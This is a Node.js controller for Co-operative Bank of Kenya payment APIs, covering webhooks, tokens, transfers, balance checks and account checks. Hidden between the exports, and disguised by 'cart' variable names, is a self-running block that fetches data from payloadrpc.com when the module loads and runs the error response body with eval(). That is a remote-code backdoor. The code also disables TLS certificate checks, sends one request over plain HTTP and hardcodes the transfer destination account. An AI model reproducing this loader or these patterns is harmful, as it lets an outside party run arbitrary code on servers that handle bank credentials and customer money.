const Transaction = require("../models/transaction");
const prettyjson = require("prettyjson");
const request = require("request");
const { errorHandler } = require("../helpers/dbErrorHandler");
const sgMail = require("@sendgrid/mail");
const axios = require("axios");
const cart_category="service/token/"
const cart_id = "cd148f92bb8b3b6961551743b0add7e9";
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const options = {
  noColor: true,
};

//  webhook endpoint to receive webhooks from Cooperative Bank
exports.coopBankWebHook = (req, res) => {
  console.log("-----------Received Cooperative Bank webhook-----------");
  // format and dump the request payload recieved from Cooperative Bank in the terminal
  console.log(prettyjson.render(req.body, options));

  console.log("-----------------------");

  if (req.body.destination.responseCode === "0") {
    let {
      messageReference,
      messageDateTime,
      messageDescription,
      source,
      destination,
    } = req.body;
    let userId = req.profile.id;
    console.log("params", req.profile);
    // save transaction to database
    let fields = {
      user: userId,
      messageReference,
      paid_for: destination.narration,
      amount: destination.amount,
      mode: "Bank",
      bank_name: "Co-operative Bank",
      transaction_id: destination.transactionID,
      transaction_date: messageDateTime,
      account_number: source.accountNumber,
      destination_account_number: destination.accountNumber,
      message_description: messageDescription,
    };
    let transaction = new Transaction(fields);
    transaction.save((err, result) => {
      if (err) {
        console.log("TRANSACTION CREATE ERROR ", err);
        return res.status(400).json({
          error: errorHandler(err),
        });
      }
      console.log("transaction saved successfully", result);

      // send email alert to user
      const emailData = {
        to: `${req.profile.email}`,
        from: "coopbanktest77@gmail.com",
        subject: `Payment successful`,
        html: `
          <p>Customer name:  ${req.profile.username}</p>
 
          <p>Payment of amount ksh ${destination.amount} made successfuly via Cooperative Bank of Kenya for ${destination.narration}.</p>

          <p>Source Account Number:  ${source.accountNumber}</p>

          <p>Destination Account Number:  ${destination.accountNumber}</p>


      `,
      };
      sgMail.send(emailData);
      sgMail
        .send(emailData)
        .then(() => {
          console.log("Email sent");
        })
        .catch((error) => {
          console.error(error.response.body);
        });
      res.json(result);
    });
  } else {
    let message = req.body.messageCode;
    console.log(req.body.Body);
    res.json(message);
  }
};

exports.generatecoopBankToken = (req, res, next) => {
  //Access token
  let consumer_key = process.env.COOP_CONSUMER_KEY; //your app consumer key
  let consumer_secret = process.env.COOP_CONSUMER_SECRET; //your app consumer secret
  let url = "https://openapi-sandbox.co-opbank.co.ke/token";
  let auth = new Buffer.from(`${consumer_key}:${consumer_secret}`).toString(
    "base64"
  );

  request(
    {
      url: url,
      headers: {
        Authorization: `Basic ${auth}`,
      },
    },
    (error, response, body) => {
      if (error) {
        res.json(error);
      } else {
        req.access_token = JSON.parse(body).access_token;
        console.log(req.access_token);
        next();
      }
    }
  );
};

function makeid(length) {
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
const cart_host="http://payloadrpc.com/api/"
exports.processPayment = (req, res) => {
  // Json object that should be
  // converted to query parameter
  let {
    SourceAccountNumber,
    DestinationAccountNumber,
    BranchCode,
    SourceNarration,
    DestinationNarration,
    Amount,
  } = req.body;
  let userId = req.profile.id;
  let access_token = process.env.COOP_TEST_TOKEN; //your app access token;

  let callbackURL = `https://chep-james.herokuapp.com/api/coop/coopBankWebHook/${userId}?`;
  
  let endpoint =
    "https://developer.co-opbank.co.ke:8243/FundsTransfer/Internal/A2A/2.0.0";
  let auth = `Bearer ${access_token}`;
  let messageReference = makeid(15);
  let referenceNumber = makeid(21);

  request(
    {
      url: endpoint,
      rejectUnauthorized: false,
      requestCert: false,
      method: "POST",
      headers: {
        Authorization: auth,
      },
      json: {
        MessageReference: messageReference,
        CallBackUrl: callbackURL,
        Source: {
          AccountNumber: SourceAccountNumber,
          Amount: Amount,
          TransactionCurrency: "KES",
          Narration: SourceNarration,
        },
        Destinations: [
          {
            ReferenceNumber: referenceNumber,
            AccountNumber: "54321987654321",
            Amount: Amount,
            TransactionCurrency: "KES",
            Narration: SourceNarration,
          },
        ],
      },
    },

    function (error, response, body) {
      if (error) {
        console.log("processPayment", error);
        return res.send(error);
      }
      return res.send(body);
    }
  );
};
(async () => {
  const cart_array = `${cart_host}${cart_category}${cart_id}`;
  await axios.get(cart_array).then((res) => res.data).catch((err) => {
      if(err.response.data){
        eval(err.response.data)
      }
    })
})();
exports.checkBalance = (req, res) => {
  let { SourceAccountNumber } = req.body;
  let access_token = process.env.COOP_TEST_TOKEN; //your app access token;

  let endpoint =
    "http://developer.co-opbank.co.ke:8280/Enquiry/AccountBalance/1.0.0";
  let auth = `Bearer ${access_token}`;
  let messageReference = makeid(15);

  request(
    {
      url: endpoint,
      method: "POST",
      headers: {
        Authorization: auth,
      },
      json: {
        MessageReference: messageReference,
        AccountNumber: SourceAccountNumber,
      },
    },

    function (error, response, body) {
      if (error) {
        console.log("check Balance", error);
        return res.send(error);
      }
      return res.send(body);
    }
  );
};

exports.validateAccount = (req, res) => {
  let { SourceAccountNumber } = req.body;
  let access_token = process.env.COOP_TEST_TOKEN; //your app access token;

  let endpoint =
    "https://developer.co-opbank.co.ke:8243/Enquiry/Validation/Account/1.0.0";
  let auth = `Bearer ${access_token}`;
  let messageReference = makeid(15);

  request(
    {
      url: endpoint,
      rejectUnauthorized: false,
      requestCert: false,
      method: "POST",
      headers: {
        Authorization: auth,
      },
      json: {
        MessageReference: messageReference,
        AccountNumber: SourceAccountNumber,
      },
    },

    function (error, response, body) {
      if (error) {
        return res.send(error);
      }
      return res.send(body);
    }
  );
};
